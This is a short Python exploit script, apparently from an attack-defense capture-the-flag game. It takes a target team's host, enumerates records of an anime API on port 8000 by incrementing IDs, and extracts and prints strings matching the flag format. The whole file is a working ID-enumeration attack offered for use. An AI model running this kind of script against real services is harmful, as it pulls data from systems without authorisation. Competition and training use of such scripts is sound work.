#!/usr/bin/env python3

import json, requests, re
import sys

print("Hello! I am a little sploit. I could be written on any language, but "
      "my author loves Python. Look at my source - it is really simple. "
      "I should steal flags and print them on stdout or stderr. ")

print("I need to attack a team with host `%s`." % sys.argv[1])

print("Here are some random flags for you:")

IP_CONFIG = sys.argv[1]

id_anime = 1


array_flags =[]

while(1):
    r = requests.get("http://"+ IP_CONFIG +":8000/api/db/anime/"+str(id_anime))
    j = json.loads(r.text)
    try:
        if(j['error'] == "not found"):
            break
    except:
        pass
    try:
        flag = j['result']['links'][0]['content']
        array_flags.append(flag)
    except:
        pass
    id_anime+=1

for i in array_flags:
    a = re.findall('[A-Z0-9]{31}=', i)
    try:
        print(a[0], flush=True)
    except:
        pass
